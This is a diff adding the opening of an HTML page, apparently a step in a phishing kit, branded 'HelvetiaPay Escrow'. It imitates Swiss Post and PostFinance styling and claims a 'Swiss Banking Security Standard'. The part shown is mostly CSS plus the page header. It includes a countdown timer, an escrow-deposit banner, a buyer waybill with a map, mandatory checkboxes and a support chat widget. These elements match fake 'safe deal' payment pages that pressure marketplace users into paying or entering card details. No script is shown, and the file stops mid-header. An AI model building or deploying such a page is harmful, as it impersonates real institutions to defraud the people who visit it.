@@ -1,0 +1,2094 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HelvetiaPay — Step 2: Escrow Verification & Buyer Waybill</title>
+  <meta name="description" content="Step 2 of 3: Verify buyer escrow deposit and confirmed Swiss Post courier dispatch address." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    /* ==========================================================================
+       SWISS FINTECH DESIGN SYSTEM (PostFinance / Die Post / Escrow Standard)
+       ========================================================================== */
+    :root {
+      --swiss-red: #D52B1E;
+      --swiss-red-hover: #B82217;
+      --swiss-red-active: #961810;
+      --swiss-red-subtle: #FEF2F2;
+      --swiss-red-border: #FECACA;
+
+      --post-yellow: #FFCC00;
+      --post-yellow-dark: #D4A800;
+
+      --neutral-0: #FFFFFF;
+      --neutral-50: #F5F5F7;
+      --neutral-100: #EAEBED;
+      --neutral-200: #DFE1E5;
+      --neutral-300: #C7CAD1;
+      --neutral-400: #8E929E;
+      --neutral-500: #636773;
+      --neutral-600: #424652;
+      --neutral-700: #2C2F38;
+      --neutral-800: #1F2128;
+      --neutral-900: #1A1A1A;
+
+      --emerald-500: #10B981;
+      --emerald-50: #ECFDF5;
+      --emerald-100: #D1FAE5;
+      --emerald-200: #A7F3D0;
+      --emerald-600: #059669;
+      --emerald-700: #047857;
+
+      --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      --font-mono: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Monaco, monospace;
+
+      --radius-sm: 6px;
+      --radius-md: 10px;
+      --radius-lg: 14px;
+      --radius-xl: 18px;
+
+      --transition-fast: 0.16s cubic-bezier(0.16, 1, 0.3, 1);
+      --transition-normal: 0.28s cubic-bezier(0.16, 1, 0.3, 1);
+
+      --shadow-subtle: 0 1px 3px rgba(0, 0, 0, 0.04), 0 1px 2px rgba(0, 0, 0, 0.02);
+      --shadow-card: 0 4px 16px -2px rgba(26, 26, 26, 0.06), 0 2px 6px -1px rgba(26, 26, 26, 0.03);
+      --shadow-floating: 0 20px 35px -8px rgba(26, 26, 26, 0.12), 0 8px 16px -4px rgba(26, 26, 26, 0.06);
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: var(--font-sans);
+      background-color: var(--neutral-50);
+      color: var(--neutral-900);
+      line-height: 1.5;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      min-height: 100vh;
+      min-height: 100dvh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    /* ==========================================================================
+       SMART STICKY HEADER (Hide on scroll down, show on scroll up)
+       ========================================================================== */
+    .header {
+      background-color: var(--neutral-0);
+      border-bottom: 1px solid var(--neutral-200);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      width: 100%;
+      transition: transform 0.28s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.2s ease;
+      will-change: transform;
+    }
+
+    .header.header-hidden {
+      transform: translateY(-100%);
+    }
+
+    @media (max-width: 767px) {
+      #main-header, .header {
+        display: none !important;
+      }
+      .main-wrapper {
+        padding-top: 0.75rem !important;
+      }
+    }
+
+    .header-inner {
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 0.85rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+    }
+
+    @media (min-width: 640px) {
+      .header-inner {
+        padding: 0.85rem 1.5rem;
+      }
+    }
+
+    .header-brand {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      text-decoration: none;
+      color: inherit;
+    }
+
+    .swiss-flag {
+      width: 28px;
+      height: 28px;
+      background-color: var(--swiss-red);
+      position: relative;
+      flex-shrink: 0;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 5px rgba(213, 43, 30, 0.25);
+    }
+
+    .swiss-flag-cross {
+      position: relative;
+      width: 16px;
+      height: 16px;
+    }
+
+    .swiss-flag-cross::before,
+    .swiss-flag-cross::after {
+      content: '';
+      position: absolute;
+      background-color: #FFFFFF;
+      border-radius: 1px;
+    }
+
+    .swiss-flag-cross::before {
+      left: 5px;
+      top: 0;
+      width: 6px;
+      height: 16px;
+    }
+
+    .swiss-flag-cross::after {
+      top: 5px;
+      left: 0;
+      width: 16px;
+      height: 6px;
+    }
+
+    .brand-divider {
+      width: 1px;
+      height: 22px;
+      background-color: var(--neutral-200);
+    }
+
+    .service-info {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .service-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: var(--neutral-900);
+      letter-spacing: -0.02em;
+      line-height: 1.2;
+    }
+
+    .service-sub {
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: var(--neutral-500);
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+
+    /* Language Switcher */
+    .lang-switcher-desktop {
+      display: none;
+    }
+
+    .lang-switcher-mobile {
+      display: block;
+    }
+
+    @media (min-width: 640px) {
+      .lang-switcher-desktop {
+        display: flex;
+        align-items: center;
+        background-color: var(--neutral-100);
+        border: 1px solid var(--neutral-200);
+        border-radius: var(--radius-sm);
+        padding: 2px;
+        gap: 1px;
+      }
+      .lang-switcher-mobile {
+        display: none;
+      }
+    }
+
+    .lang-btn {
+      background: transparent;
+      border: none;
+      padding: 0.32rem 0.55rem;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--neutral-600);
+      cursor: pointer;
+      border-radius: 4px;
+      transition: all var(--transition-fast);
+      letter-spacing: 0.02em;
+      font-family: inherit;
+    }
+
+    .lang-btn:hover {
+      color: var(--neutral-900);
+    }
+
+    .lang-btn.active {
+      background-color: var(--neutral-0);
+      color: var(--swiss-red);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+    }
+
+    .lang-select {
+      background-color: var(--neutral-0);
+      border: 1px solid var(--neutral-200);
+      padding: 0.35rem 0.55rem;
+      border-radius: var(--radius-sm);
+      font-size: 0.8125rem;
+      font-weight: 600;
+      color: var(--neutral-800);
+      font-family: inherit;
+    }
+
+    /* ==========================================================================
+       MAIN WRAPPER & STEP PROGRESS BAR
+       ========================================================================== */
+    .main-wrapper {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      padding: 1rem 1rem 3.5rem;
+      width: 100%;
+    }
+
+    .flow-container {
+      width: 100%;
+      max-width: 780px;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    /* Step Timeline Bar */
+    .step-timeline-bar {
+      display: flex;
+      flex-direction: column;
+      background-color: var(--neutral-0);
+      border: 1px solid var(--neutral-200);
+      border-radius: var(--radius-md);
+      padding: 0.85rem 1rem;
+      box-shadow: var(--shadow-subtle);
+      width: 100%;
+    }
+
+    @media (min-width: 640px) {
+      .step-timeline-bar {
+        padding: 0.85rem 1.35rem;
+      }
+    }
+
+    .timeline-steps {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      width: 100%;
+    }
+
+    .t-step {
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--neutral-400);
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    @media (min-width: 640px) {
+      .t-step {
+        font-size: 0.8125rem;
+        gap: 0.5rem;
+      }
+    }
+
+    .t-step.active {
+      color: var(--neutral-900);
+      font-weight: 700;
+    }
+
+    .t-step.completed {
+      color: var(--emerald-700);
+    }
+
+    .t-step-num {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: var(--neutral-100);
+      border: 1.5px solid var(--neutral-200);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--neutral-500);
+      flex-shrink: 0;
+      transition: all var(--transition-fast);
+    }
+
+    .t-step.completed .t-step-num {
+      background-color: var(--emerald-500);
+      border-color: var(--emerald-500);
+      color: #FFFFFF;
+    }
+
+    .t-step.active .t-step-num {
+      background-color: var(--swiss-red);
+      border-color: var(--swiss-red);
+      color: #FFFFFF;
+      box-shadow: 0 0 0 3px rgba(213, 43, 30, 0.15);
+    }
+
+    .t-step-line {
+      flex: 1;
+      height: 2px;
+      background-color: var(--neutral-200);
+      margin: 0 0.5rem;
+      position: relative;
+      min-width: 14px;
+    }
+
+    .t-step-line-fill {
+      height: 100%;
+      background-color: var(--emerald-500);
+    }
+
+    /* Mobile-only active step subtitle */
+    .mobile-active-step-label {
+      display: none;
+    }
+
+    @media (max-width: 600px) {
+      .t-step .t-step-label {
+        display: none;
+      }
+      .t-step-line {
+        margin: 0 0.25rem;
+      }
+      .mobile-active-step-label {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.45rem;
+        margin-top: 0.55rem;
+        padding-top: 0.45rem;
+        border-top: 1px solid var(--neutral-100);
+        font-size: 0.78rem;
+        font-weight: 700;
+        color: var(--neutral-800);
+      }
+      .mobile-step-pill {
+        background-color: var(--swiss-red-subtle);
+        color: var(--swiss-red);
+        border: 1px solid var(--swiss-red-border);
+        padding: 0.12rem 0.45rem;
+        border-radius: 4px;
+        font-size: 0.7rem;
+        font-weight: 700;
+      }
+    }
+
+    /* Sub Navigation / Timer */
+    .status-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+
+    .back-nav-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      font-size: 0.8125rem;
+      font-weight: 600;
+      color: var(--neutral-600);
+      text-decoration: none;
+      transition: color var(--transition-fast);
+    }
+
+    .back-nav-link:hover {
+      color: var(--swiss-red);
+    }
+
+    .timer-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--swiss-red);
+      background-color: var(--swiss-red-subtle);
+      border: 1px solid var(--swiss-red-border);
+      padding: 0.25rem 0.65rem;
+      border-radius: var(--radius-sm);
+      font-feature-settings: "tnum";
+    }
+
+    /* ==========================================================================
+       BANKER SECURITY SHIELD & ESCROW STATUS
+       ========================================================================== */
+    .escrow-banker-banner {
+      background: linear-gradient(135deg, #ECFDF5 0%, #F0FDF4 100%);
+      border: 1px solid var(--emerald-200);
+      border-radius: var(--radius-md);
+      padding: 1.15rem 1.25rem;
+      display: flex;
+      align-items: flex-start;
+      gap: 0.85rem;
+      box-shadow: var(--shadow-subtle);
+      position: relative;
+      overflow: hidden;
+    }
+
+    @media (min-width: 640px) {
+      .escrow-banker-banner {
+        padding: 1.25rem 1.5rem;
+        gap: 1.15rem;
+      }
+    }
+
+    .escrow-banker-banner::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      width: 4px;
+      background-color: var(--emerald-500);
+    }
+
+    .shield-icon-wrap {
+      width: 42px;
+      height: 42px;
+      background-color: #FFFFFF;
+      border: 1px solid var(--emerald-200);
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--emerald-600);
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px rgba(16, 185, 129, 0.12);
+    }
+
+    .escrow-banner-content {
+      flex: 1;
+    }
+
+    .escrow-banner-title {
+      font-size: 1rem;
+      font-weight: 800;
+      color: var(--emerald-700);
+      letter-spacing: -0.015em;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      flex-wrap: wrap;
+    }
+
+    @media (min-width: 640px) {
+      .escrow-banner-title {
+        font-size: 1.05rem;
+      }
+    }
+
+    .escrow-lock-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.25rem;
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: var(--emerald-700);
+      background-color: #FFFFFF;
+      border: 1px solid var(--emerald-200);
+      padding: 0.15rem 0.45rem;
+      border-radius: 10px;
+      text-transform: uppercase;
+    }
+
+    .escrow-banner-desc {
+      font-size: 0.84rem;
+      color: #065F46;
+      margin-top: 0.35rem;
+      line-height: 1.45;
+    }
+
+    .escrow-banner-amount {
+      font-weight: 800;
+      font-feature-settings: "tnum";
+      color: var(--neutral-900);
+      background-color: #FFFFFF;
+      padding: 0.1rem 0.4rem;
+      border-radius: 4px;
+      border: 1px solid var(--emerald-200);
+    }
+
+    /* ==========================================================================
+       SWISS POST (DIE POST) READ-ONLY DISPATCH WAYBILL
+       ========================================================================== */
+    .waybill-card {
+      background-color: var(--neutral-0);
+      border: 1px solid var(--neutral-200);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      box-shadow: var(--shadow-card);
+    }
+
+    .waybill-header {
+      background-color: #FAFAFB;
+      border-bottom: 1px solid var(--neutral-200);
+      padding: 0.9rem 1.15rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    @media (max-width: 639px) {
+      .waybill-header {
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        gap: 0.5rem;
+      }
+      .post-logo-block {
+        flex-direction: column;
+        align-items: center;
+        gap: 0.35rem;
+      }
+    }
+
+    @media (min-width: 640px) {
+      .waybill-header {
+        padding: 1rem 1.5rem;
+      }
+    }
+
+    .post-logo-block {
+      display: flex;
+      align-items: center;
+      gap: 0.65rem;
+    }
+
+    .die-post-emblem {
+      background-color: var(--post-yellow);
+      color: #1A1A1A;
+      font-weight: 800;
+      font-size: 0.78rem;
+      letter-spacing: -0.01em;
+      padding: 0.28rem 0.55rem;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+      border: 1px solid #E5B800;
+      flex-shrink: 0;
+    }
+
+    .die-post-cross {
+      width: 10px;
+      height: 10px;
+      background-color: var(--swiss-red);
+      position: relative;
+      border-radius: 1px;
+    }
+
+    .die-post-cross::before,
+    .die-post-cross::after {
+      content: '';
+      position: absolute;
+      background-color: #FFFFFF;
+    }
+
+    .die-post-cross::before { left: 3px; top: 0; width: 4px; height: 10px; }
+    .die-post-cross::after { top: 3px; left: 0; width: 10px; height: 4px; }
+
+    .waybill-title-text {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--neutral-800);
+    }
+
+    .waybill-badge-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: var(--emerald-700);
+      background-color: var(--emerald-50);
+      border: 1px solid var(--emerald-200);
+      padding: 0.2rem 0.55rem;
+      border-radius: 12px;
+    }
+
+    .waybill-badge-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background-color: var(--emerald-500);
+    }
+
+    .waybill-body {
+      padding: 1.15rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+
+    @media (min-width: 680px) {
+      .waybill-body {
+        padding: 1.5rem;
+      }
+    }
+
+    /* Structured Buyer Details Grid (Mobile: 1 Col, Desktop: 2 Col) */
+    .dispatch-info-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 0.85rem;
+    }
+
+    @media (min-width: 540px) {
+      .dispatch-info-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 1rem;
+      }
+    }
+
+    .dispatch-item {
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+
+    .dispatch-item.full-width {
+      grid-column: 1 / -1;
+    }
+
+    .dispatch-label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--neutral-500);
+    }
+
+    .dispatch-val-box {
+      background-color: var(--neutral-50);
+      border: 1px solid var(--neutral-200);
+      border-radius: var(--radius-sm);
+      padding: 0.65rem 0.85rem;
+      font-size: 0.875rem;
+      font-weight: 600;
+      color: var(--neutral-900);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.5rem;
+    }
+
+    .dispatch-val-box.highlight {
+      background-color: #FFFFFF;
+      border-color: var(--neutral-300);
+      font-weight: 700;
+    }
+
+    .dispatch-val-box.prominent {
+      background: linear-gradient(135deg, #FFFFFF 0%, #F9FAFB 100%);
+      border: 1px solid var(--neutral-300);
+      padding: 0.75rem 0.85rem;
+    }
+
+    .prominent-city-title {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: var(--neutral-900);
+      letter-spacing: -0.01em;
+    }
+
+    .prominent-canton-tag {
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: var(--neutral-600);
+      background-color: var(--neutral-200);
+      padding: 0.15rem 0.45rem;
+      border-radius: 3px;
+    }
+
+    .verified-check-mini {
+      color: var(--emerald-600);
+      display: flex;
+      align-items: center;
+      flex-shrink: 0;
+    }
+
+    /* Swiss Mini-Map Widget (100% width, no overflow) */
+    .map-widget-container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 0.4rem;
+    }
+
+    .map-widget {
+      width: 100%;
+      height: 200px;
+      background: #F4F5F7;
+      border: 1px solid var(--neutral-200);
+      border-radius: var(--radius-sm);
+      overflow: hidden;
+      position: relative;
+      box-shadow: inset 0 1px 4px rgba(0,0,0,0.05);
+    }
+
+    @media (min-width: 640px) {
+      .map-widget {
+        height: 230px;
+      }
+    }
+
+    .map-canvas-layer {
+      position: absolute;
+      inset: 0;
+      background-color: #F3F4F6;
+      background-image: 
+        radial-gradient(rgba(148, 163, 184, 0.18) 1px, transparent 1px);
+      background-size: 20px 20px;
+      background-position: 0 0;
+      opacity: 0.85;
+    }
+
+    .map-road-svg {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Ambient Glassmorphic Map Vignette Edge */
+    .map-glass-edge {
+      position: absolute;
+      inset: 0;
+      box-shadow: inset 0 0 22px rgba(15, 23, 42, 0.07);
+      pointer-events: none;
+      z-index: 7;
+      border-radius: inherit;
+    }
+
+    /* Laser-sweep Animated Scanning Beam */
+    .map-scan-beam {
+      position: absolute;
+      top: 0;
+      bottom: 0;
+      left: 0;
+      width: 180px;
+      background: linear-gradient(90deg, transparent 0%, rgba(213, 43, 30, 0.04) 40%, rgba(255, 255, 255, 0.45) 50%, rgba(213, 43, 30, 0.04) 60%, transparent 100%);
+      pointer-events: none;
+      z-index: 6;
+      animation: mapScanSweep 4s ease-in-out infinite;
+    }
+
+    @keyframes mapScanSweep {
+      0% { transform: translateX(-150%); }
+      100% { transform: translateX(450%); }
+    }
+
+    .map-pin-pulse-wrap {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      z-index: 12;
+      pointer-events: none;
+    }
+
+    .map-radar-dot {
+      width: 12px;
+      height: 12px;
+      background-color: var(--swiss-red);
+      border-radius: 50%;
+      border: 2px solid #FFFFFF;
+      box-shadow: 0 0 14px rgba(213, 43, 30, 0.9), 0 2px 5px rgba(0, 0, 0, 0.3);
+      position: relative;
+      z-index: 3;
+    }
+
+    .map-pulse-ring {
+      position: absolute;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background-color: rgba(213, 43, 30, 0.2);
+      border: 1.5px solid rgba(213, 43, 30, 0.6);
+      animation: swissRadarPing 2.8s cubic-bezier(0, 0, 0.2, 1) infinite;
+      top: -10px;
+    }
+
+    .map-pulse-ring-secondary {
+      position: absolute;
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      border: 1px dashed rgba(213, 43, 30, 0.35);
+      animation: swissRadarPing 2.8s cubic-bezier(0, 0, 0.2, 1) 0.9s infinite;
+      top: -21px;
+    }
+
+    @keyframes swissRadarPing {
+      0% { transform: scale(0.3); opacity: 1; }
+      100% { transform: scale(2.4); opacity: 0; }
+    }
+
+    .map-pin-label {
+      background-color: var(--neutral-900);
+      color: #FFFFFF;
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 0.22rem 0.55rem;
+      border-radius: 4px;
+      margin-top: 8px;
+      white-space: nowrap;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.18);
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    .map-pin-dot-indicator {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background-color: #10B981;
+      animation: blinkGreen 1.5s infinite;
+    }
+
+    @keyframes blinkGreen {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .map-hud-overlay {
+      position: absolute;
+      bottom: 8px;
+      left: 10px;
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      font-weight: 600;
+      color: var(--neutral-700);
+      background-color: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(4px);
+      padding: 0.2rem 0.55rem;
+      border-radius: 4px;
+      border: 1px solid var(--neutral-200);
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .map-scale-tag {
+      position: absolute;
+      bottom: 8px;
+      right: 10px;
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      color: var(--neutral-600);
+      background-color: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(4px);
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      border: 1px solid var(--neutral-200);
+      z-index: 10;
+    }
+
+    .map-caption {
+      font-size: 0.74rem;
+      color: var(--neutral-500);
+      display: flex;
+      align-items: center;
+      gap: 0.35rem;
+      margin-top: 0.15rem;
+    }
+
+    /* ==========================================================================
+       MANDATORY CONFIRMATION CHECKBOXES
+       ========================================================================== */
+    .confirmation-terms-card {
+      background-color: var(--neutral-0);
+      border: 1px solid var(--neutral-200);
+      border-radius: var(--radius-md);
+      padding: 1.15rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.85rem;
+      box-shadow: var(--shadow-subtle);
+    }
+
+    @media (min-width: 640px) {
+      .confirmation-terms-card {
+        padding: 1.35rem;
+        gap: 1rem;
+      }
+    }
+
+    .custom-checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      cursor: pointer;
+      user-select: none;
+      padding: 0.45rem 0.5rem;
+      border-radius: var(--radius-sm);
+      transition: background-color var(--transition-fast);
+      position: relative;
+    }
+
+    .custom-checkbox-row:hover {
+      background-color: var(--neutral-50);
+    }
+
+    .checkbox-box {
+      width: 20px;
+      height: 20px;
+      border: 2px solid var(--neutral-300);
+      border-radius: var(--radius-sm);
+      background-color: #FFFFFF;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+      transition: all var(--transition-fast);
+    }
+
+    .custom-checkbox-row input[type="checkbox"] {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      width: 0;
+      height: 0;
+    }
+
+    .custom-checkbox-row input[type="checkbox"]:checked + .checkbox-box {
+      background-color: var(--swiss-red);
+      border-color: var(--swiss-red);
+    }
+
+    .checkbox-check-icon {
+      color: #FFFFFF;
+      opacity: 0;
+      transform: scale(0.5);
+      transition: all var(--transition-fast);
+    }
+
+    .custom-checkbox-row input[type="checkbox"]:checked + .checkbox-box .checkbox-check-icon {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .checkbox-label-text {
+      font-size: 0.84rem;
+      color: var(--neutral-700);
+      line-height: 1.45;
+      font-weight: 500;
+    }
+
+    .checkbox-label-text strong {
+      color: var(--neutral-900);
+      font-weight: 700;
+    }
+
+    /* Primary Action Button */
+    .btn-action-primary {
+      background-color: var(--swiss-red);
+      color: #FFFFFF;
+      border: 1px solid var(--swiss-red);
+      font-family: inherit;
+      font-size: 0.95rem;
+      font-weight: 700;
+      padding: 0.95rem 1.5rem;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.65rem;
+      width: 100%;
+      text-decoration: none;
+      transition: all var(--transition-fast);
+      letter-spacing: -0.01em;
+      box-shadow: 0 4px 12px rgba(213, 43, 30, 0.2);
+    }
+
+    @media (min-width: 640px) {
+      .btn-action-primary {
+        font-size: 1rem;
+        padding: 1rem 1.75rem;
+      }
+    }
+
+    .btn-action-primary:hover:not(:disabled) {
+      background-color: var(--swiss-red-hover);
+      box-shadow: 0 6px 18px rgba(213, 43, 30, 0.3);
+      transform: translateY(-1px);
+    }
+
+    .btn-action-primary:active:not(:disabled) {
+      background-color: var(--swiss-red-active);
+      transform: translateY(1px);
+    }
+
+    .btn-action-primary:disabled,
+    .action-btn:disabled {
+      background-color: var(--neutral-200);
+      border-color: var(--neutral-200);
+      color: var(--neutral-400);
+      cursor: not-allowed;
+      box-shadow: none;
+      transform: none;
+      opacity: 0.5;
+      pointer-events: none;
+    }
+
+    .btn-spinner {
+      display: none;
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #FFFFFF;
+      animation: spin 0.7s linear infinite;
+    }
+
+    .btn-action-primary[aria-busy="true"] .btn-spinner {
+      display: inline-block;
+    }
+
+    .btn-action-primary[aria-busy="true"] .btn-arrow {
+      display: none;
+    }
+
+    /* Support Chat Widget */
+    .chat-trigger {
+      position: fixed;
+      bottom: 1.25rem;
+      right: 1.25rem;
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      background-color: var(--neutral-900);
+      color: #FFFFFF;
+      border: 1px solid var(--neutral-700);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: var(--shadow-floating);
+      z-index: 90;
+      transition: all var(--transition-fast);
+    }
+
+    .chat-trigger:hover {
+      background-color: var(--swiss-red);
+      border-color: var(--swiss-red);
+      transform: scale(1.05);
+    }
+
+    .chat-widget-panel {
+      position: fixed;
+      bottom: 4.75rem;
+      right: 1.25rem;
+      width: 350px;
+      max-width: calc(100vw - 2.5rem);
+      height: 460px;
+      max-height: calc(100dvh - 6.5rem);
+      background-color: var(--neutral-0);
+      border: 1px solid var(--neutral-200);
+      border-radius: var(--radius-md);
+      box-shadow: var(--shadow-floating);
+      display: none;
+      flex-direction: column;
+      z-index: 95;
+      overflow: hidden;
+    }
+
+    .chat-widget-panel.open {
+      display: flex;
+    }
+
+    .chat-header {
+      background-color: var(--neutral-900);
+      color: #FFFFFF;
+      padding: 0.85rem 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .chat-body {
+      flex: 1;
+      padding: 1rem;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+      background-color: var(--neutral-50);
+    }
+
+    .chat-msg {
+      max-width: 84%;
+      font-size: 0.8125rem;
+      line-height: 1.45;
+      padding: 0.65rem 0.85rem;
+      border-radius: var(--radius-sm);
+    }
+
+    .chat-msg.system {
+      background-color: var(--neutral-0);
+      border: 1px solid var(--neutral-200);
+      color: var(--neutral-800);
+      align-self: flex-start;
+    }
+
+    .chat-msg.user {
+      background-color: var(--swiss-red);
+      color: #FFFFFF;
+      align-self: flex-end;
+    }
+
+    .chat-footer {
+      padding: 0.75rem;
+      background-color: var(--neutral-0);
+      border-top: 1px solid var(--neutral-200);
+      display: flex;
+      gap: 0.5rem;
+    }
+
+    .chat-input {
+      flex: 1;
+      border: 1px solid var(--neutral-300);
+      border-radius: var(--radius-sm);
+      padding: 0.45rem 0.65rem;
+      font-family: inherit;
+      font-size: 0.8125rem;
+      outline: none;
+    }
+
+    .chat-send-btn {
+      background-color: var(--swiss-red);
+      color: #FFFFFF;
+      border: none;
+      padding: 0.45rem 0.75rem;
+      border-radius: var(--radius-sm);
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 1.5rem;
+      left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background-color: var(--neutral-900);
+      color: #FFFFFF;
+      font-size: 0.8125rem;
+      font-weight: 600;
+      padding: 0.65rem 1.25rem;
+      border-radius: var(--radius-sm);
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 120;
+    }
+
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <!-- ==========================================================================
+       SMART HEADER
+       ========================================================================== -->
+  <header class="header" id="main-header">
+    <div class="header-inner">
+      <div class="header-brand">
+        <div class="swiss-flag" title="Swiss Banking Security Standard" aria-label="Swiss Standard">
+          <div class="swiss-flag-cross"></div>
+        </div>
+        <div class="brand-divider"></div>
+        <div class="service-info">
+          <div class="service-title">HelvetiaPay Escrow</div>
+          <div class="service-sub">Swiss Interbank Settlement</div>
+        </div>
+      </div>
+
+      <!-- Desktop Language Selector (DE, FR, IT, EN, RM) -->
+      <nav class="lang-switcher-desktop" aria-label="Language selector">
+        <button type="button" class="lang-btn" data-lang="DE" id="lang-btn-de">DE</button>
+        <button type="button" class="lang-btn" data-lang="FR" id="lang-btn-fr">FR</button>
+        <button type="button" class="lang-btn" data-lang="IT" id="lang-btn-it">IT</button>
+        <button type="button" class="lang-btn active" data-lang="EN" id="lang-btn-en">EN</button>
+        <button type="button" class="lang-btn" data-lang="RM" id="lang-btn-rm">RM</button>
+      </nav>
+
+      <!-- Mobile Language Selector -->
+      <div class="lang-switcher-mobile">
